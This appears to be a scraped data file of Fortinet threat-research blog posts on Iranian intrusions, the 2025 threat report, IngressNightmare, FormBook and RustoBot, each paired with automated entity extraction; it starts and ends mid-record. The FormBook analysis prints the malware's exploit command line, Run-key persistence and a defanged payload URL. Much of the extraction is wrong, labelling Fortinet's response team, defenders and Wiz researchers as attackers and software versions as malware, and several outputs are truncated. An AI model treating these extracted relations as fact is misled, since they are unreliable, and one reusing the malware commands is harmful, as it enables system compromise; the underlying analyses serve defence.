HanifNet, and HXLibrary backdoors. They then stole credentials and moved laterally using RDP and PsExec. 2. Consolidating the Foothold (April 2024 – November 2024)Additional persistence mechanisms were introduced, including NeoExpressRAT. The adversary chained proxies (plink, Ngrok) to bypass segmentation, exfiltrated targeted email data, and began interacting with virtualization infrastructure. 3. Initial Remediation and Adversary Response (November 2024 – December 2024)The victim implemented initial containment steps, prompting a surge in adversary activity. To maintain access, additional web shells, SystemBC, and MeshCentral were deployed, with a focus on targeting deeper CNI network segments. 4. Intrusion Containment and Final Adversary Response (December 2024 – Present)The victim successfully removed adversary access. In response, attackers attempted to re-enter via vulnerabilities in web applications and launched targeted phishing campaigns to steal credentials. Multiple failed access attempts were detected. The victim organization had a highly segmented network, including a restricted Operational Technology (OT) environment. While no confirmed disruption to OT systems was found, FGIR observed targeted reconnaissance and credential harvesting, indicating strong adversary interest in these systems. The attackers moved from IT to restricted segments by chaining proxy tools and implants to bypass segmentation. The attacker relied on VPS-hosted infrastructure, avoiding U.S.-based providers. Notable malware variants used include: State-sponsored cyber adversaries continue to target and compromise critical infrastructure networks, seeking to maintain persistent access. Organizations should prioritize the following defensive measures: This investigation highlights the persistent and evolving nature of state-backed cyber threats targeting Middle Eastern CNIs. The adversary demonstrated advanced tactics to deeply embed themselves, evade detection, and sustain long-term access. Despite containment efforts, the adversary has continued efforts to regain access, indicating a long-term strategic interest in this environment. Organizations must remain vigilant, continuously refining their detection and response strategies to defend against sophisticated, state-sponsored cyber campaigns. For adetailed breakdown of adversary TTPs, novel malware, and IOCs, access the full reporthere. incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (FGIR, Attacker), (Iranian state-sponsored threat group, Attacker), (Novel malware, Malware), (plink, Tool), (Ngrok, Tool), (glider proxy, Tool), (ReverseSocks5, Tool), (web shells, File), (public-facing, File), (SSL VPN, Tool), (NeoExpressRAT, Tool), (Foothold and Initial Operations, Phase), (May 2023 – April 2024, Time Period), (Attackers, Attacker), (Victim's SSL VPN, Victim), (Persistence, Technique), (Multiple web shells and backdoors, File), (Havoc, Tool), (HanifNet, Tool), (HXLibrary, Tool), (NeoExpressRAT, Tool), (Establishing a Foothold and Initial Operations, Phase)\nRelationships: (FortiGuard Labs Threat Research, investigates, FGIR), (FGIR, uses, Novel malware), (FGIR, analyzes, IOCs), (FGIR, attributes, Iranian state-sponsored threat group), (Iranian state-sponsored threat group, uses, plink), (Iranian state-sponsored threat group, uses, Ngrok), (Iranian state-sponsored threat group, uses, glider proxy), (Iranian state-sponsored threat group, uses, ReverseSocks5), (Iranian state-sponsored threat group",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "FGIR",
          "Attacker"
        ],
        [
          "Iranian state-sponsored threat group",
          "Attacker"
        ],
        [
          "Novel malware",
          "Malware"
        ],
        [
          "plink",
          "Tool"
        ],
        [
          "Ngrok",
          "Tool"
        ],
        [
          "glider proxy",
          "Tool"
        ],
        [
          "ReverseSocks5",
          "Tool"
        ],
        [
          "web shells",
          "File"
        ],
        [
          "public-facing",
          "File"
        ],
        [
          "SSL VPN",
          "Tool"
        ],
        [
          "NeoExpressRAT",
          "Tool"
        ],
        [
          "Foothold and Initial Operations",
          "Phase"
        ],
        [
          "May 2023 – April 2024",
          "Time Period"
        ],
        [
          "Attackers",
          "Attacker"
        ],
        [
          "Victim's SSL VPN",
          "Victim"
        ],
        [
          "Persistence",
          "Technique"
        ],
        [
          "Multiple web shells and backdoors",
          "File"
        ],
        [
          "Havoc",
          "Tool"
        ],
        [
          "HanifNet",
          "Tool"
        ],
        [
          "HXLibrary",
          "Tool"
        ],
        [
          "NeoExpressRAT",
          "Tool"
        ],
        [
          "Establishing a Foothold and Initial Operations",
          "Phase"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "investigates",
          "FGIR"
        ],
        [
          "FGIR",
          "uses",
          "Novel malware"
        ],
        [
          "FGIR",
          "analyzes",
          "IOCs"
        ],
        [
          "FGIR",
          "attributes",
          "Iranian state-sponsored threat group"
        ],
        [
          "Iranian state-sponsored threat group",
          "uses",
          "plink"
        ],
        [
          "Iranian state-sponsored threat group",
          "uses",
          "Ngrok"
        ],
        [
          "Iranian state-sponsored threat group",
          "uses",
          "glider proxy"
        ],
        [
          "Iranian state-sponsored threat group",
          "uses",
          "ReverseSocks5"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 23,
    "relationship_count": 8
  },
  {
    "title": "Key Takeaways from the 2025 Global Threat Landscape Report",
    "link": "https://www.fortinet.com/blog/threat-research/key-takeaways-from-the-2025-global-threat-landscape-report",
    "content": "FortiGuard Labs Threat Research In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours. The2025 Global Threat Landscape Reportdraws on telemetry from Fortinet’s global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Across every stage of the attack chain, automation is reshaping threat behavior. In the reconnaissance phase, cybercriminals launched over 36,000 scans per second in 2024, a 16.7% global increase. These scans are no longer just searching for exposed ports; they’re probing deep into operational technology (OT), cloud APIs, and identity layers. SIP-based VoIP systems, RDP servers, and industrial protocols like Modbus TCP are being mapped automatically and continuously. Automation also extends to phishing, credential theft, and even malware development. Cyber adversaries use AI-powered tools like FraudGPT and ElevenLabs to craft convincing phishing lures, generate deepfake videos, and clone executive voices. Cybercriminals no longer need to write code or breach a system directly; threat actors can purchase access, tools, and infrastructure through a rapidly growing Cybercrime-as-a-Service (CaaS) marketplace. The result is an industrialized cybercrime economy that dramatically lowers the barrier to entry, expands the volume of attacks, and increases their success rate. In 2024, FortiGuard Labs tracked a 42% surge in stolen credentials offered on darknet forums. That’s more than 100 billion unique records—email addresses, passwords, session tokens, and multifactor bypass data—freely traded and sold. Infostealer malware like Redline and Vidar contributed to a 500% increase in credential log activity, much of it harvested in real time and sold by Initial Access Brokers (IABs) offering turnkey infiltration into corporate VPNs, RDPs, and admin panels. These credentials are the backbone of ransomware and espionage operations. Threat actors no longer just hunt for vulnerabilities to exploit; they’re buying entry into your network. And as long as stolen credentials remain abundant, brute force is unnecessary. Cloud services now sit at the center of modern operations, and identity has become one of the most critical security perimeters. Cloud breaches are no longer limited to misconfigured storage buckets. As infrastructure migrates to the cloud, attackers are finding familiar footholds to exploit, such as over-permissioned identities, credential leaks in public code repositories, and lateral movement through cloud-native services. FortiCNAPP telemetry shows that attackers often begin by logging in from unfamiliar geographies, sometimes within hours of a developer’s legitimate activity. From there, they escalate privileges, establish persistence, and use legitimate services to blend into normal network traffic. In 2024, 25% of all cloud incidents began with reconnaissance, such as API enumeration, permission probing, and discovery of exposed assets. Automation is also fueling scale. Fortinet’s intrusion prevention sensors recorded over 97 billion exploitation attempts in the second half of 2024, many targeting vulnerabilities disclosed years ago. CVE-2017-0147 (26.7% of all exploitation attempts), CVE-2021-44228 (11.6%), and CVE-2019-18935 (8%) remain among the most exploited—clear evidence that legacy exposures continue to create present-day risk. IoT devices were also a major target, accounting for over 20% of all exploits. Routers, surveillance cameras, and firewalls with outdated firmware or default credentials are being recruited into botnets, used for lateral movement, or exploited for persistent access. But what’s striking isn’t just the volume of exploitation. It’s how methodical it has become. Attackers aren’t wasting time. They map the exposed surfaces of potential victims, wait for a vulnerability to emerge, and either strike before the organization can apply a patch or sell that vulnerability information on darknet forums. Once inside, adversaries move with precision. In 88% of observed cases involving lateral movement, attackers used RDP to pivot within the network. Remote Access Trojans (RATs) such as Xeno RAT and SparkRAT provided remote command execution, data exfiltration, and long-term persistence. Living-off-the-land techniques using legitimate Windows tools and protocols have made traditional detection approaches less effective. Attackers routinely leveraged PowerShell, WMI, and SMB traffic anomalies to move laterally and escalate privileges. Active Directory manipulation (via DCSync and DCShadow) enabled attackers to harvest credentials and silently expand their access. Encrypted C2 channels, domain generation algorithms, and DNS tunneling were widely used to maintain communication with compromised systems, all while bypassing conventional perimeter defenses. The pattern is clear: Attackers are optimizing for speed, scale, and stealth. Defenders must do the same. Traditional security models that rely on static controls, point-in-time assessments, or delayed patch cycles are increasingly inadequate. What’s needed is a shift toward Continuous Threat Exposure Management (CTEM): This isn’t a technology conversation; it’s a business continuity conversation. Cyberthreats no longer wait for vulnerabilities to be exposed. Their reconnaissance efforts monitor all levels of the network, including compromised credentials and other weaknesses available on darknet forums, so they can strike before your team can respond. The global threat landscape is evolving, but the mission remains the same: reduce exposure, increase visibility, and move faster than the adversary. The Fortinet Security Fabric is designed to meet this challenge, uniting advanced threat intelligence, real-time detection, and coordinated response across the entire digital infrastructure. Executives must ensure their organizations are not only protected but positioned to adapt. Download the full2025 Global Threat Landscape Reportto gain deeper insights into these evolving threats and the strategies needed to counter them. FortiGuard Labs Threat Research Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Company), (Threat Research, Topic), (2024, Year), (Global Threat Landscape Report, Document), (SIP-based VoIP system, Device), (RDP server, Device), (Industrial protocol, Protocol), (Modbus TCP, Protocol), (FraudGPT, Tool), (ElevenLabs, Tool), (Executive voice cloning, Technique), (AI-powered tool, Tool), (Phishing lures, Technique), (Deepfake video, Technique), (Credential theft, Technique), (Malware development, Technique), (Automation, Technique), (Reconnaissance phase, Stage), (Operational Technology, OT), (Cloud API, API), (Identity layer, Layer), (Defenders, Attacker), (Organizations, Attacker), (Risk measurement, Measure), (Action, Action)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (2024, occursIn, Reconnaissance phase), (2024, increases, Scans per second), (Scans per second, increasedBy, 16.7%), (Scans per second, during, Reconnaissance phase), (Reconnaissance phase, involves, Phishing), (Reconnaissance phase, involves, Credential theft), (Reconnaissance phase, involves, Malware development), (Reconnaissance phase, involves, Automation), (Recon",
      "entities": [
        [
          "FortiGuard Labs",
          "Company"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "2024",
          "Year"
        ],
        [
          "Global Threat Landscape Report",
          "Document"
        ],
        [
          "SIP-based VoIP system",
          "Device"
        ],
        [
          "RDP server",
          "Device"
        ],
        [
          "Industrial protocol",
          "Protocol"
        ],
        [
          "Modbus TCP",
          "Protocol"
        ],
        [
          "FraudGPT",
          "Tool"
        ],
        [
          "ElevenLabs",
          "Tool"
        ],
        [
          "Executive voice cloning",
          "Technique"
        ],
        [
          "AI-powered tool",
          "Tool"
        ],
        [
          "Phishing lures",
          "Technique"
        ],
        [
          "Deepfake video",
          "Technique"
        ],
        [
          "Credential theft",
          "Technique"
        ],
        [
          "Malware development",
          "Technique"
        ],
        [
          "Automation",
          "Technique"
        ],
        [
          "Reconnaissance phase",
          "Stage"
        ],
        [
          "Operational Technology",
          "OT"
        ],
        [
          "Cloud API",
          "API"
        ],
        [
          "Identity layer",
          "Layer"
        ],
        [
          "Defenders",
          "Attacker"
        ],
        [
          "Organizations",
          "Attacker"
        ],
        [
          "Risk measurement",
          "Measure"
        ],
        [
          "Action",
          "Action"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "2024",
          "occursIn",
          "Reconnaissance phase"
        ],
        [
          "2024",
          "increases",
          "Scans per second"
        ],
        [
          "Scans per second",
          "increasedBy",
          "16.7%"
        ],
        [
          "Scans per second",
          "during",
          "Reconnaissance phase"
        ],
        [
          "Reconnaissance phase",
          "involves",
          "Phishing"
        ],
        [
          "Reconnaissance phase",
          "involves",
          "Credential theft"
        ],
        [
          "Reconnaissance phase",
          "involves",
          "Malware development"
        ],
        [
          "Reconnaissance phase",
          "involves",
          "Automation"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 25,
    "relationship_count": 9
  },
  {
    "title": "IngressNightmare: Understanding CVE‑2025‑1974 in Kubernetes Ingress-NGINX",
    "link": "https://www.fortinet.com/blog/threat-research/ingressnightmare-understanding-cve-2025-1974-in-kubernetes-ingress-nginx",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical On March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE‑2025‑1974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. This article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We’ll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks. Key Point: In many configurations, the admission webhook is reachable from within the cluster’s network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials. Our testing confirmed that this exploit path requires an attacker to reach the Ingress-NGINX admission controller on the cluster network. If you can only access the cluster via kubectl port-forward or other indirect means, some temporary file uploading steps may not work reliably. Hence, in practice, this RCE exploit is often executed from a pod that already has an internal vantage point on the cluster network (for example, a malicious container running due to SSRF, a misconfigured job, or a prior partial compromise). When chained, these vulnerabilities let an attacker: We’ve created a short video demonstration that showcases how the exploit works from start to finish, which you can watch here: Network Note: Our tests confirm that port forwarding doesn’t always replicate the network conditions needed to trigger the file upload mechanism. We recommend running the exploit from a pod already in the cluster’s network if you’re assessing your own environment. Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include: For a more detailed look at the patch details, see: Within our test environment, we leveragedLacework FortiCNAPPcomponents to gain multi-layered visibility into the compromise: In our demo, alerts were generated when we: Beyond Lacework FortiCNAPP’s container-aware protections, the broaderFortinet Security Fabricprovides additional layers of defense: For a summary of how Fortinet addresses this specific vulnerability and the associated set of CVEs, see theFortiGuard Threat Signal Reportpublished on April 3rd, 2025. IngressNightmare(CVE‑2025‑1974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed. Fortunately, patching and hardening are straightforward: Continuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane. Organizations can keep their Kubernetes clusters resilient against emerging threats like IngressNightmare by staying current on vulnerability disclosures and employing a defense-in-depth approach. Thank you for reading—and be sure to watch thedemo videofor an in-depth look at this exploit in action. Stay vigilant, and keep your clusters secure! FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerability: CVE-2025-1974: Kubernetes.Ingress.NGINX.Controller.Remote.Code.Execution If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Partners Business and Technology Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity Type), (Ingress-NGINX Containers v1.11.0-4, Malware), (v1.12.0, Malware), (<v1.11.0, Malware), (Impacted Users, Entity Type), (Any Organization, Entity Type), (Impact, Entity Type), (Attackers, Entity Type), (gain control of the vulnerable systems, Action), (Critical, Severity Level), (March 24, 2025, Date), (researchers from Wiz, Inc., Attacker), (Ingress-NGINX controller, Malware), (IngressNightmare, Name), (CVE‑2025‑1974, Vulnerability), (network access, Threat Type), (admission webhook, Tool), (remote code execution (RCE), Action), (RCE, Action), (pod, Entity Type), (cluster's network, Entity Type), (Kubernetes A, Entity Type)\\nRelationships: (FortiGuard Labs Threat Research, affectedPlatforms, Ingress-NGINX Containers v1.11.0-4), (Ingress-NGINX Containers v1.11.0-4, Malware), (v1.12.0, Malware), (v1.11.0, Malware), (Impacted Users, Any",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity Type"
        ],
        [
          "Ingress-NGINX Containers v1.11.0-4",
          "Malware"
        ],
        [
          "v1.12.0",
          "Malware"
        ],
        [
          "<v1.11.0",
          "Malware"
        ],
        [
          "Impacted Users",
          "Entity Type"
        ],
        [
          "Any Organization",
          "Entity Type"
        ],
        [
          "Impact",
          "Entity Type"
        ],
        [
          "Attackers",
          "Entity Type"
        ],
        [
          "gain control of the vulnerable systems",
          "Action"
        ],
        [
          "Critical",
          "Severity Level"
        ],
        [
          "March 24",
          "2025",
          "Date"
        ],
        [
          "researchers from Wiz",
          "Inc.",
          "Attacker"
        ],
        [
          "Ingress-NGINX controller",
          "Malware"
        ],
        [
          "IngressNightmare",
          "Name"
        ],
        [
          "CVE‑2025‑1974",
          "Vulnerability"
        ],
        [
          "network access",
          "Threat Type"
        ],
        [
          "admission webhook",
          "Tool"
        ],
        [
          "RCE",
          "Action"
        ],
        [
          "pod",
          "Entity Type"
        ],
        [
          "cluster's network",
          "Entity Type"
        ],
        [
          "Kubernetes A",
          "Entity Type"
        ],
        [
          "FortiGuard Labs Threat Research",
          "affectedPlatforms",
          "Ingress-NGINX Containers v1.11.0-4"
        ],
        [
          "Ingress-NGINX Containers v1.11.0-4",
          "Malware"
        ],
        [
          "v1.12.0",
          "Malware"
        ],
        [
          "v1.11.0",
          "Malware"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 25,
    "relationship_count": 0
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part I",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign-part-i",
    "content": "FortiGuard Labs Threat Research Fortinet’s FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook. Formbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim’s keystrokes, screenshots, and system clipboard data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. I will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing. The phishing campaign starts with an email disguised as a sales order urging the recipient to open the attached Word document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. The attached Word document, order0087.docx, is saved in OOXML (Office Open XML) format and compressed as a ZIP archive. Figure 2 reveals the relevant files and file contents inside the Word document. When the recipient opens the Word document, the “<w:altChunk>” node within document.xml is parsed, automatically loading an external file, “Algeria.rtf,” as shown in Figure 2. The RTF file (“Algeria.rtf”) is obfuscated with a large amount of junk data. After de-obfuscating the RTF file, two embedded binary objects (leading by “\\objdata” tag) can be found within it. The first binary object is a package containing a 64-bit DLL file, as shown in Figure 3. The DLL file, named “AdobeID.pdf,” is extracted to the system %temp% folder when the RTF is opened in Microsoft Word. The second binary object is in OLE format and contains crafted equation data intended for Microsoft Equation Editor 3.0. When Word parses the RTF file, this exploits the CVE-2017-11882 vulnerability. CVE-2017-11882is a known remote code execution (RCE) vulnerability in Microsoft Equation Editor (EQNEDT32.EXE). Parsing the crafted equation data in EQNEDT32.EXE causes a buffer overflow, and the return address of the vulnerable function is overwritten with 0x430C12, as seen in Figure 4. The instruction at 0x430C12 is “call  ds:WinExec(),” which is called after the buffer overflow occurs and the vulnerable function returns to this address. Figure 5 shows a screenshot of EQNEDT32.exe calling this API at 0x430C12. The command-line parameter to WinExec() API is “CmD.exe /C rundll32 %tmp%\\AdobeID.pdf,IEX  A”. This command is copied by the vulnerable function from the crafted equation data, as shown in Figure 4. As a result, the extracted 64-bit DLL file, AdobeID.pdf, is executed by rundll32.exe. Based on my analysis, the 64-bit DLL acts as a downloader and installer for Formbook. Let’s examine how it works. It adds a key into “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” with the following settings: Key name: “RtkAudUService”Key value: “C:\\Windows\\System32\\rundll32.exe C:\\Users\\win-10\\AppData\\Roaming\\Templates\\AdobeID.pdf, IEX” This ensures the malicious command-line command executes automatically at the system’s startup. Figure 6 shows the added auto-run item in the system registry. Correspondingly, it: 1> Creates a folder named “Templates” under the %appdata% folder. 2> Copies the extracted 64-bit DLL into the new folder by executing the following command-line command: “cmd.exe /c copy C:\\Users\\%username%\\AppData\\Local\\Temp\\AdobeID.pdf   C:\\Users\\%username%\\AppData\\Roaming\\Templates” The Formbook payload is disguised as a picture file (PNG) to be downloaded. The URL to the PNG file is: “hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png” To retrieve the payload, it uses multiple Windows API functions, including: WinHttpCrackUrl(),WinHttpOpen(),WinHttpConnect(),WinHttpOpenRequest(),WinHttpSendRequest(),WinHttpQueryOption(),WinHttpReceiveResponse(),WinHttpQueryDataAvailable()WinHttpReadData() I manually downloaded the PNG file to analyze it. Its size is 0x47000 (284KB). I then observed that its content is encrypted rather than a legitimate PNG (Figure 7). The malware then calls a function to decrypt the PNG file into the FormBook executable binary, as seen in Figure 8. The decrypted FormBook can be seen in the memory at the bottom. The decryption key is generated from a hardcoded string, “H1OX2WsqMLPKvGkQ.” To evade detection by endpoint security software, the FormBook payload executable is kept entirely in the memory. Since it does not write the decrypted Formbook to a local file to execute, this is a fileless variant of FormBook. This variant of FormBook chooses “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe” as a target process to run the decrypted FormBook via process hollowing. The full path of the target process is hardcoded in the variant, which is passed to CreateProcessInternalW() API. In Figure 9 below, we see that the process is about to call the CreateProcessInternalW() API, whose second parameter (RDX holds) is a string of the full path of the target process. The sixth parameter ([rsp+30]) represents the CreationFlag. The value for the CreationFlag is 0x808040C, which is a combination of the following flags: CREATE_SUSPENDEDDETACHED_PROCESSCREATE_UNICODE_ENVIRONMENTCREATE_NO_WINDOW This ultimately creates a suspended “ImagingDevices.exe” process. The malware employs sophisticated process injection techniques: It creates a temporary and invisible file by calling two APIs: GetTempFileNameW()NtCreateFile() It then calls NtWriteFile() to write the decrypted FormBook executable into the invisible temporary file. Next, it calls NtCreateSection() API to create a memory section object from the temporary file, whose file handle is passed to the API. It then maps the section object into the target process (ImagingDevices.exe) by calling the Windows native API NtMapViewOfSection(). It also returns the address of the mapped FormBook inside the target process. At that point, the decrypted FormBook has been copied into the target process. Next, it calls the Wow64GetThreadContext() API to retrieve the thread context (the CPU register value/state) of the suspended target process. It then modifies the value of some registers so the target process points to the mapped FormBook. The corresponding API, Wow64SetThreadContext(), is then called to apply the modified registers to the target process. Figure 11 shows the WOW64_CONTEXT data in memory. It only modifies two register values, EAX to 0x6E1550 and EBX to 0x2D0D0. Why does it only modify those two registers rather than EIP? The selective modification of only EAX and EBX becomes clear when examining the target process's suspended state. The process has been intercepted at the execution of RtlUserThreadStart(), where EAX holds the thread function address and EBX contains the parameter to be passed to this thread function. Now, the value of EAX holds the entry point of FormBook inside the target process, where FormBook’s base address is 0x6E0000. It finally calls the Windows native API, NtResumeThread(), to resume the target process, and the RtlUserThreadStart() API is invoked to run the FormBook payload in a newly created thread. In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process. To start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,” into the system’s temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL. The DLL file is launched via rundll32.exe, establishing persistence on the victim’s system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file. I then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task. InPart IIof this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven’s Gate technique to prevent analysis and detection. I’ll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim’s system. Stay tuned. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant. The relevant URL downloading the PNG file is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-11882 with the signature “MS.Office.EQNEDT32.EXE.Equation.Parsing.Memory.Corruption”. FortiGuard Antivirus service detects the malicious Word document, the embedded RTF file, the extracted 64-bit Dll file as well as the decrypted FormBook with the following AV signatures. MSWord/Formbook.9184!trRTF/CVE_2017_11882.FB!exploitW64/Formbook.RT!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png [order0087.docx]93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184 [Algeria.rtf]7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B [AdobeID.pdf]2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56 [Decrypted FormBook from PNG file]6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Threat Research, Topic), (Fortinet, Company), (FortiGuard Labs, Malware), (Formbook, Malware), (CVE-2017-11882, Vulnerability), (Figure 1, Image)\nRelationships: (FortiGuard Labs, observes, phishing campaign), (FortiGuard Labs, uses, FortiMail), (FortiGuard Labs, presents, analysis blogs), (FortiGuard Labs, publishes, analysis blog), (FortiGuard Labs, analyzes, phishing email), (FortiGuard Labs, discovers, crafting data), (FortiGuard Labs, identifies, exploited vulnerability), (FortiGuard Labs, detects, virus), (FortiGuard Labs, flags, email)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "Fortinet",
          "Company"
        ],
        [
          "FortiGuard Labs",
          "Malware"
        ],
        [
          "Formbook",
          "Malware"
        ],
        [
          "CVE-2017-11882",
          "Vulnerability"
        ],
        [
          "Figure 1",
          "Image"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "observes",
          "phishing campaign"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "FortiMail"
        ],
        [
          "FortiGuard Labs",
          "presents",
          "analysis blogs"
        ],
        [
          "FortiGuard Labs",
          "publishes",
          "analysis blog"
        ],
        [
          "FortiGuard Labs",
          "analyzes",
          "phishing email"
        ],
        [
          "FortiGuard Labs",
          "discovers",
          "crafting data"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "exploited vulnerability"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "virus"
        ],
        [
          "FortiGuard Labs",
          "flags",
          "email"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 9
  },
  {
    "title": "New Rust Botnet \"RustoBot\" is Routed via Routers",
    "link": "https://www.fortinet.com/blog/threat-research/new-rust-botnet-rustobot-is-routed-via-routers",
    "content": "FortiGuard Labs Threat Research Affected Platforms:TOTOLINK N600R V4.3.0cu.7570_B20200620. TOTOLINK A830R V5.9c.4729_B20191112, A3100R V4.1.2cu.5050_B20200504, A950RG V4.1.2cu.5161_B20200903, A800R V4.1.2cu.5137_B20200730, A3000RU V5.9c.5185_B20201128, and A810R V4.1.2cu.5182_B20201026. DrayTek Vigor2960 and Vigor300B 1.5.1.4.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs recently discovered a new botnet propagating through TOTOLINK devices. Unlike previous malware targeting these devices, this variant is written inRust—a programming language introduced by Mozilla in 2010. Due to its Rust-based implementation, we’ve named the malware“RustoBot.” 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In January and February of 2025, FortiGuard Labs observed a significant increase in alerts related to attacking via TOTOLINK vulnerabilities. TOTOLINK vulnerabilities often stem from thecstecgi.cgifile—a CGI script responsible for processing user inputs, configuration changes, authentication, and administrative commands. These scripts have repeatedly been found to contain flaws, most notably command injection vulnerabilities that can be exploited remotely. Attackers can leverage various functions within this script to achieve remote code execution, includingsetUpgradeFW(CVE-2022-26210) 